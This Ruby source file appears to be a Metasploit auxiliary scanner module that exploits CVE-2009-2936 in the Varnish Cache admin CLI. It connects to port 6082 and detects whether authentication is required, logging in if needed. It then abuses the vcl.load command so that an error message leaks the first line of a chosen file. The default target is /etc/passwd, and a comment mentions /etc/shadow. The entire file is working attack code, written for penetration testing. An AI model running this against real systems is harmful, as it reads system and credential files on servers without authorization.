##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/tcp/client'
require 'metasploit/framework/varnish/client'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Metasploit::Framework::Varnish::Client

  def initialize
    super(
      'Name'           => 'Varnish Cache CLI File Read',
      'Description'    => 'This module attempts to read the first line of a file by abusing the error message when
                           compiling a file with vcl.load.',
      'References'     =>
        [
          [ 'OSVDB', '67670' ],
          [ 'CVE', '2009-2936' ],
          [ 'EDB', '35581' ],
          [ 'URL', 'https://www.varnish-cache.org/trac/wiki/CLI' ]
        ],
      'Author'         =>
        [
          'patrick', #original module
          'h00die <mike@shorebreaksecurity.com>' #updates and standardizations
        ],
      'License'         =>  MSF_LICENSE,
      'DefaultOptions'  =>  {
        'RPORT' => 6082
      }
    )

    register_options(
      [
        OptString.new('PASSWORD',  [ false, 'Password for CLI.  No auth will be automatically detected', '' ]),
        OptString.new('FILE',  [ false, 'File to read the first line of', '/etc/passwd' ])
      ])
  end

  def run_host(ip)
    # first check if we even need auth
    begin
      connect
      challenge = require_auth?
      close_session
      disconnect
      connect
      if !challenge
        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: No Authentication Required"
      else
        if not login(datastore['PASSWORD'])
          vprint_error "#{ip}:#{rport} - Unable to Login"
          return
        end
      end
      # abuse vcl.load to load a varnish config file and save it to a random variable.  This will fail to give us the first line in debug message
      sock.get_once
      sock.puts("vcl.load #{Rex::Text.rand_text_alphanumeric(3)} #{datastore['FILE']}")
      result = sock.get_once
      if result && result =~ /Line \d Pos \d+\)\n(.*)/
        vprint_good($1)
      else
        vprint_error(result) # will say something like "Cannot open '/etc/shadow'"
      end
      close_session
      disconnect
    rescue Rex::ConnectionError, EOFError, Timeout::Error
      print_error "#{ip}:#{rport} - Unable to connect"
    end
  end
end
